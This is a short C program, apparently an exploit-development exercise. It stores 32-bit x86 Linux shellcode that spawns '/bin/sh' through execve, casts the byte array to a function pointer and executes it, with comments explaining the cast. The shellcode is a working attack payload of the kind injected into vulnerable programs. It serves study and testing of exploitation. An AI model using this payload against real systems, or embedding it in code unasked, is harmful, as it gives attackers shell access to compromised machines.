#include <stdio.h>

int main(void) {

    char shellcode[] = "\xEB\x0B\x5B\x31\xC0\x31\xC9\x31\xD2\xB0\x0B\xCD\x80\xE8\xF0\xFF\xFF\xFF\x2F\x62\x69\x6E\x2F\x73\x68";
    int (*ret)() = (int (*)())shellcode;
    // The above line will create an integer pointer ret make it point to a function which doesn't require parameter [ indicated by the () ]. Then it will type casting to cast the shellcode to a function pointer of the same type.
    // So this will essentially cast your shellcode array address to a function pointer which you can later use to call it as a function and execute the code.
    ret(); // Execute the shellcode

}
